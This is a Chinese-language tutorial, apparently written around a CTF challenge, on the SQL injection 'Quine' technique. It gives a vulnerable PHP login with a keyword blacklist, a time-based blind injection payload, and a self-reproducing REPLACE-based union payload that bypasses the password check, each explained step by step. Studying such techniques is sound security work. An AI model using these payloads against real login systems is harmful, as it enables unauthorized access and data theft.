# 简介

`Quine`又叫做自产生程序，在`sql`注入技术中，这是一种是的输入的`SQL`

语句与输出的`SQL`语句一致的技术，常用于一些特殊的登陆绕过`sql`注入中。





实践

````
function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') {
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
    die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}
````

观察这个源码，存在一个看似很明显的`SQL`注入，黑名单中还有许多的过滤。

例如：

like替换'=',benchmark()替换sleep函数，mid()函数替换`substr()`函数，/**/替换空格。

下面是注入的payload

````
union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),{},1)) like {}),(select benchmark(4999999,md5('test'))),1)#
````

（`sys.schema_table_statistics_with_buffer`是`Mysql`数据库中的一个系统视图，提供了数据库中的表哦的统计信息和缓冲池的使用情况）

这样注入得到的表中并没有密码。

再观察源码

````
$sql="SELECT password FROM users WHERE username='admin' and password='$password';";
$user_result=mysqli_query($con,$sql);
$row = mysqli_fetch_array($user_result);

if ($row['password'] === $password) {
    die($FLAG);
````

简单说说就是`sql`查询得到的结果与password相等，那么除了正常的逻辑的密码相同会产生相等，如果我们的输入与最后的结果，一样可以绕过验证，这就是`Quine`。

````
REPLACE ( string1 , string2 , string3 )
````

首先要知道replace函数的三个参数，第一个参数是要替换的整个字符串，第二个参数被替换的字符(串) ，第三个是要替换成的字符(串)

直接分析这个地方使用`Quine`技术的payload

````
union/**/SELECT/**/REPLACE(REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#
````

首先是一个大的REPLACE(),令他为A

````
REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39))
````

其中有一个字符串，令他为B

````
"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
````

则最初的payload就为

````
union/**/SELECT/**/REPLACE(A,CHAR(46),B)/**/AS/**/ch3ns1r#

A：REPLACE('B',CHAR(34),CHAR(39))
B："/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
````

下面这个就是`Quine`的基本形式了

````
REPLACE(A,CHAR(46),B)  ----char(46)= .   char(34)="   char(39)='
````

外层replace()：将双引号char(34)双引号替换为char(39)单引号。

内层replace():  将点号char(46)替换为整个payload字符串。

举个例子：
假设一个`str`为（）

````
REPLACE(".",CHAR(46),".")
````

最后的语句为：

````
REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")')
````

首先执行char(46)得到的是点号，然后执行replace()

最后得到的结果是：
````
REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")')
````

将`str1`中的点号都替换为了`str`





最后再详细的解释一下最开始的payload

````
'/**/union/**/SELECT/**/REPLACE(REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#
````

完整的结构为：

````
REPLACE(
  REPLACE(
    '原Payload字符串', 
    CHAR(34),  -- 替换双引号为单引号
    CHAR(39)
  ),
  CHAR(46),    -- 替换点号(.)为新的Payload
  '新Payload字符串'
)
````

首先执行内层的replace()

````
REPLACE(
    '原Payload字符串', 
    CHAR(34),  -- 替换双引号为单引号
    CHAR(39)
  )
  
原Payload字符串："/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
````

得到的结果为：
````
'/**/union/**/SELECT/**/REPLACE(REPLACE('.',CHAR(34),CHAR(39)),CHAR(46),'.')/**/AS/**/ch3ns1r#
````

再执行外部的replace

````
REPLACE(
  第一次的结果,
  CHAR(46),    -- 替换点号(.)为新的Payload
  '新Payload字符串'
)
````

得到的结果为：
````
'/**/union/**/SELECT/**/REPLACE(REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#'
````

**精妙的地方：**

通过内层的replace()将单引号全部转化为了双引号从而解决了符号的问题。

